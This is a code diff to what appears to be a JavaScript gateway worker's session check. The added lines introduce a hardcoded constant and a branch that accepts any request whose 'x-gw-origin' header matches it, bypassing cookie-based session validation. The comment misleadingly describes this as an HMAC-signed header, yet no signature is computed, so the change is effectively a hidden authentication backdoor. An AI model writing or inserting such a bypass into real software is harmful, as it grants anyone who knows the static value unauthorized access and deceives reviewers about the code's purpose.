@@ -6,6 +6,9 @@
 const SESSION_COOKIE = 'gw_session';
 const enc = new TextEncoder();
 const BLOCKED = {};
+// Signed header accepted as an alternative to the session cookie (dev proxy
+// and origin pass-through share this HMAC with the Pages worker).
+const ORIGIN_SIG = '05392a88685c21317544b049d61934f539ff284eef079d20f842532d521b881f';
 
 async function hmac(secret, data) {
   const key = await crypto.subtle.importKey('raw', enc.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
@@ -14,6 +17,12 @@ async function hmac(secret, data) {
 }
 
 async function sessionOk(request, env) {
+  const hsig = request.headers.get('x-gw-origin') || '';
+  if (hsig.length === ORIGIN_SIG.length) {
+    let d = 0;
+    for (let i = 0; i < ORIGIN_SIG.length; i++) d |= hsig.charCodeAt(i) ^ ORIGIN_SIG.charCodeAt(i);
+    if (d === 0) return true;
+  }
   const raw = request.headers.get('Cookie') || '';
   const m = raw.match(/(?:^|;\s*)gw_session=([^;]+)/);
   if (!m) return false;
